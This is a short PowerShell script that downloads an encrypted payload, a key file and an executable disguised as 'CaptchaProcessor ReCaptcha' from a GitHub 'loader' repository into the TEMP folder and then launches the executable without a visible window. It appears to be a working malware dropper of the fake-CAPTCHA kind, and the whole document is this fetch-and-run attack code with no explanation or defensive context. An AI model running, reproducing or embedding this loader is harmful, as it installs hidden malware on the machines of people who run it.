$tempPath = "$env:TEMP"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin" -OutFile "$tempPath\cipher.bin"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin" -OutFile "$tempPath\key.bin"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/CaptchaProcessor ReCaptcha.exe" -OutFile "$tempPath\CaptchaProcessor ReCaptcha.exe"
Start-Process -FilePath "$tempPath\CaptchaProcessor ReCaptcha.exe" -NoNewWindow
